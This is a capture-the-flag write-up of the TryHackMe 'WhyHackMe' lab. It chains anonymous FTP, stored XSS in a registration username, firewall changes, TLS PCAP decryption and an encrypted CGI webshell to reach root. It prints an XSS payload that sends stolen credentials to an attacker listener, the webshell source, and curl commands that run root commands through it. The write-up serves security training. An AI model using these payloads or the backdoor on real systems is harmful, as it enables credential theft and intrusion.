# WhyHackMe — TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** WhyHackMe  
**Difficulty:** Medium  
**OS:** Ubuntu 20.04 (Linux 5.4.0-159)  
**Tags:** Stored XSS, Client-Side SSRF, PCAP Analysis, TLS Decryption, CGI Backdoor, iptables  

---

## Summary

WhyHackMe is a multi-stage boot2root challenge that chains together anonymous FTP information disclosure, stored XSS via an unsanitised registration username field (leveraged as a client-side SSRF to exfiltrate localhost-restricted credentials), firewall manipulation through sudo iptables, TLS traffic decryption of a PCAP file using a world-readable SSL private key, and finally abuse of an encrypted CGI webshell left behind by a previous attacker — all the way to root via unrestricted sudo privileges on the www-data account.

---

## Reconnaissance

### Nmap Scan

```bash
nmap -sCV -O -p- <TARGET_IP>
```

| Port | State | Service | Version |
|------|-------|---------|---------|
| 21 | open | FTP | vsftpd 3.0.3 (Anonymous login allowed) |
| 22 | open | SSH | OpenSSH 8.2p1 Ubuntu |
| 80 | open | HTTP | Apache 2.4.41 (Ubuntu), PHP |
| 41312 | filtered | unknown | — |

Key observations:
- FTP allows anonymous access with a file `update.txt` available.
- HTTP serves a PHP application with `PHPSESSID` cookie (HttpOnly flag set).
- Port 41312 is filtered — suggesting a firewall rule blocking external access to an internal service.

### Web Enumeration

```bash
gobuster dir -u http://whyhackme.thm \
  -w /usr/share/wordlists/SecLists/Discovery/Web-Content/big.txt \
  -t 50 -x php,html,txt,bak,zip,js
```

Discovered endpoints:

| Path | Status | Notes |
|------|--------|-------|
| `/blog.php` | 200 | Blog with comment section (login required) |
| `/login.php` | 200 | Authentication form |
| `/register.php` | 200 | User registration |
| `/config.php` | 200 | Empty body (PHP config, no output) |
| `/logout.php` | 302 | Redirects to login.php |
| `/dir/` | 403 | Forbidden (Apache `Require local`) |
| `/assets/` | 200 | Directory listing (CSS files) |

> **Lesson learned:** `feroxbuster` without the `-x` flag only discovers directories and extensionless files. Always use `-x php,txt,bak,html,js,zip` for full coverage on PHP targets — same as `gobuster -x`.

---

## Phase 1 — FTP Anonymous Access & Information Gathering

```bash
ftp whyhackme.thm
# Login: anonymous (no password)
get update.txt
```

Contents of `update.txt`:

```
Hey I just removed the old user mike because that account was compromised 
and for any of you who wants the creds of new account visit 
127.0.0.1/dir/pass.txt and don't worry this file is only accessible by 
localhost(127.0.0.1), so nobody else can view it except me or people with 
access to the common account.
- admin
```

Key takeaways:
- Credentials for a new account are stored at `/dir/pass.txt`.
- The file is restricted to localhost access only (Apache `Require local` directive).
- A "common account" exists with access.

Direct access attempt returns `403 Forbidden`:

```bash
curl -s http://whyhackme.thm/dir/pass.txt
# 403 Forbidden
```

---

## Phase 2 — Stored XSS via Username (Client-Side SSRF)

### Identifying the Vulnerability

The blog at `/blog.php` features a comment section with an admin note: *"I will be monitoring your comments so please be safe and civil"* — a strong indicator of a bot periodically rendering user-submitted content (classic stored XSS setup).

Testing the `comment` field revealed that all HTML tags are encoded via `htmlspecialchars()`:

```html
<!-- Input -->
<script>alert(1)</script>

<!-- Output -->
&lt;script&gt;alert(1)&lt;/script&gt;
```

However, the `username` field in `/register.php` was **not sanitised**. When a user posts a comment, their name is rendered raw in the HTML:

```html
<h2>Name: <script>...</script><br>Comment: nice blog!</h2>
```

> **Critical lesson:** Always test ALL input fields that render in output — registration username, display name, profile fields — not just the obvious content field (comment/message). Developers often sanitise only the "expected" user-content field and forget others.

### Crafting the Payload

Since the `PHPSESSID` cookie has the `HttpOnly` flag set, `document.cookie` would return an empty string — making traditional cookie theft ineffective. Instead, the XSS was weaponised as a **client-side SSRF**: the admin bot's browser runs on localhost, so it can fetch the restricted `/dir/pass.txt` and exfiltrate the contents.

```bash
# Register a new user with XSS payload as username
curl -s -X POST http://whyhackme.thm/register.php \
  --data-urlencode 'username=<script>fetch("http://127.0.0.1/dir/pass.txt").then(r=>r.text()).then(t=>{new Image().src="http://<ATTACKER_IP>:8888/?d="+btoa(t)})</script>' \
  -d 'password=pass123'

# Login with the XSS username
curl -s -X POST http://whyhackme.thm/login.php \
  --data-urlencode 'username=<script>fetch("http://127.0.0.1/dir/pass.txt").then(r=>r.text()).then(t=>{new Image().src="http://<ATTACKER_IP>:8888/?d="+btoa(t)})</script>' \
  -d 'password=pass123' \
  -c cookies.txt

# Post a normal comment to trigger the username rendering
curl -s -b cookies.txt -X POST http://whyhackme.thm/blog.php \
  -d 'comment=nice blog!'
```

### Catching the Callback

```bash
python3 -m http.server 8888
```

When the admin bot (`/root/bot.py` using pyppeteer/headless Chromium) visited `blog.php`, the XSS executed in its browser context. Since the bot runs on localhost, `fetch("http://127.0.0.1/dir/pass.txt")` succeeded and the base64-encoded content was sent to our listener:

```
10.x.x.x - - "GET /?d=amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1" 200 -
```

Decoding:

```bash
echo "amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=" | base64 -d
# jack:WhyIsMyP*******oStrongIDK
```

---

## Phase 3 — SSH Access & User Flag

```bash
ssh jack@whyhackme.thm
# Password: WhyIsMyP*******oStrongIDK
```

```bash
cat ~/user.txt
# 1ca4eb20178**********70fca87b866a
```

### Local Enumeration

```bash
sudo -l
# User jack may run the following commands on ubuntu:
#     (ALL : ALL) /usr/sbin/iptables
```

```bash
cat /opt/urgent.txt
```

```
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ 
and when I try to remove them, they wont, even though I am root. Please go 
through the pcap file in /opt and help me fix the server. And I temporarily 
blocked the attackers access to the backdoor by using iptables rules.
```

Key findings:
- `jack` can run `iptables` as root (sudo).
- Port 41312 is blocked by an iptables DROP rule (rule #1).
- A CGI backdoor exists in `/usr/lib/cgi-bin/` (immutable — `chattr +i`).
- A PCAP file at `/opt/capture.pcap` contains evidence of the previous attack.
- Port 41312 is confirmed listening (`ss -tlnp`).

---

## Phase 4 — Unblocking Port 41312

The iptables rules show the first rule drops all traffic to port 41312:

```bash
sudo iptables -L -n -v --line-numbers
# num  target  prot  source       destination
# 1    DROP    tcp   0.0.0.0/0    0.0.0.0/0    tcp dpt:41312
# ...
```

Remove the blocking rule:

```bash
sudo iptables -D INPUT 1
```

Verify the service responds:

```bash
curl -k https://localhost:41312/
# 403 Forbidden — Apache/2.4.41 on port 41312 (HTTPS)
```

---

## Phase 5 — TLS PCAP Decryption

The Apache virtual host config for port 41312 reveals SSL configuration:

```bash
cat /etc/apache2/sites-enabled/000-default.conf
```

```apache
Listen 41312
<VirtualHost *:41312>
    SSLEngine on
    SSLCipherSuite AES256-SHA
    SSLProtocol -all +TLSv1.2
    SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
    SSLCertificateKeyFile /etc/apache2/certs/apache.key
    ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
    AddHandler cgi-script .cgi .py .pl
    DocumentRoot /usr/lib/cgi-bin/
</VirtualHost>
```

Both the certificate and **private key are world-readable**:

```bash
ls -la /etc/apache2/certs/
# -rw-r--r-- 1 root root 2025 apache-certificate.crt
# -rw-r--r-- 1 root root 3272 apache.key
```

> **Note:** The cipher suite `AES256-SHA` uses RSA key exchange (no PFS/DHE/ECDHE), which means the server's RSA private key can decrypt captured TLS sessions.

### Decrypting the PCAP with tshark

```bash
tshark -r /opt/capture.pcap \
  -o tls.keys_list:"0.0.0.0,41312,http,/etc/apache2/certs/apache.key" \
  -Y "tls.app_data" \
  2>/dev/null
```

Decrypted HTTP requests reveal the attacker's activity:

| Frame | Source | Destination | Request | Response |
|-------|--------|-------------|---------|----------|
| 25 | 10.133.71.33 | 10.13.64.69 | `GET /` | 403 Forbidden |
| 48 | 10.133.71.33 | 10.13.64.69 | `GET /cgi-bin/5UP3r53Cr37.py` | 200 OK |
| 69 | 10.133.71.33 | 10.13.64.69 | `GET /cgi-bin/5UP3r53Cr37.py?key=48pfPH***&iv=VZukhsC***&cmd=id` | 200 OK |
| 90 | 10.133.71.33 | 10.13.64.69 | `GET /cgi-bin/5UP3r53Cr37.py?key=48pfPH***&iv=VZukhsC***&cmd=ls -al` | 200 OK |

---

## Phase 6 — CGI Backdoor & Root

### Backdoor Analysis

The CGI script is an AES-CBC encrypted webshell:

```python
#!/usr/bin/python3
from Crypto.Cipher import AES
import os, base64, cgi, cgitb

print("Content-type: text/html\n\n")
enc_pay = b'k/1umtqRYGJzyyR1kNy3Z+m6bg7Xp7PXXFB9sOih2IPNBRR++jJvUzWZ+WuGdax2ngHyU9seaIb5rEqGcQ7OJA=='
form = cgi.FieldStorage()
try:
    iv = bytes(form.getvalue('iv'), 'utf-8')
    key = bytes(form.getvalue('key'), 'utf-8')
    cipher = AES.new(key, AES.MODE_CBC, iv)
    orgnl = cipher.decrypt(base64.b64decode(enc_pay))
    print("<h2>" + eval(orgnl) + "<h2>")
except:
    print("")
```

The encrypted payload, when decrypted with the correct key/IV, evaluates to an expression that executes the `cmd` parameter via `os.popen()`. The `key` and `iv` values were extracted from the PCAP.

### Execution & Privilege Escalation

```bash
# Test execution
curl -sk "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?\
key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id"
# uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)

# Check sudo privileges
curl -sk "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?\
key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20-l"
# User www-data may run the following commands on ubuntu:
#     (ALL : ALL) NOPASSWD: ALL
```

The `www-data` user has **unrestricted passwordless sudo** — a privilege likely granted by the previous attacker to maintain persistent root access.

### Root Flag

```bash
curl -sk "https://localhost:41312/cgi-bin/5UP3r53Cr37.py?\
key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=sudo%20cat%20%2Froot%2Froot.txt"
# 4dbe2259ae538**********2479b5475c72
```

---

## Flags

| Flag | Value |
|------|-------|
| User | `1ca4eb20178**********70fca87b866a` |
| Root | `4dbe2259ae538**********2479b5475c72` |

---

## Kill Chain Summary

```
FTP Anonymous
  └─ update.txt → hint: creds at localhost/dir/pass.txt
       └─ register.php: XSS in username (no htmlspecialchars)
            └─ Stored XSS → Client-Side SSRF via admin bot
                 └─ Bot fetches 127.0.0.1/dir/pass.txt → base64 exfil
                      └─ jack:WhyIsMyP*******oStrongIDK → SSH
                           └─ sudo iptables → unblock port 41312
                                └─ Readable SSL key → tshark pcap decrypt
                                     └─ CGI backdoor /cgi-bin/5UP3r53Cr37.py
                                          └─ www-data (sudo NOPASSWD ALL) → root
```

---

## Key Techniques & Lessons

1. **Test ALL input fields for injection** — The comment field was properly sanitised with `htmlspecialchars()`, but the username field at registration was not. Developers often protect only the "expected" user-content field and overlook others that also render in output.

2. **Client-side SSRF via Stored XSS** — When cookie theft is blocked by HttpOnly, XSS can still be weaponised by making the victim's browser (which runs on localhost) fetch restricted resources and exfiltrate the response. This is more powerful than cookie theft.

3. **Readable TLS private keys enable full traffic decryption** — The SSL private key was world-readable, and the cipher suite (`AES256-SHA`) uses RSA key exchange without Perfect Forward Secrecy, allowing retrospective decryption of captured TLS sessions.

4. **tshark TLS decryption syntax** — For RSA key exchange: `tshark -r capture.pcap -o tls.keys_list:"0.0.0.0,PORT,http,/path/to/key" -Y "tls.app_data"`.

5. **sudo iptables = firewall manipulation** — Same class as UFW panel abuse: if a user can modify firewall rules, blocked services become accessible.

6. **feroxbuster needs `-x` for extension brute-forcing** — Without explicit extensions (`-x php,txt,bak`), it only discovers directories and extensionless files, missing critical endpoints like `register.php`.

---

## Tools Used

- nmap, gobuster, feroxbuster, curl, tshark
- Python HTTP server (listener)
- FTP client (anonymous access)
- SSH client

## References

- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
- [OWASP WSTG-INPV-02: Stored Cross-Site Scripting](https://owasp.org/www-project-web-security-testing-guide/)
- [OWASP WSTG-CRYP-01: Testing for Weak Transport Layer Security](https://owasp.org/www-project-web-security-testing-guide/)
